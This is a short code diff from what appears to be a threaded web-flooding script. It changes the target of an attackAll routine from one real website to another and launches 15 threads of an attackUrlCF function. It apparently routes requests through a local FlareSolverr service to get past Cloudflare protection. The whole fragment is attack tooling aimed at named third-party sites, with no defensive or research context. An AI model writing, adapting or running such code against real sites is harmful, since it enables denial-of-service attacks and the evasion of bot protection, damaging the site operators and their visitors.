@@ -124,7 +124,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(15):
-	Thread(target=attackUrlCF, args=['https://royaloakinvestment.com/', i]).start()
+	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
 	time.sleep(30)
 input()
 
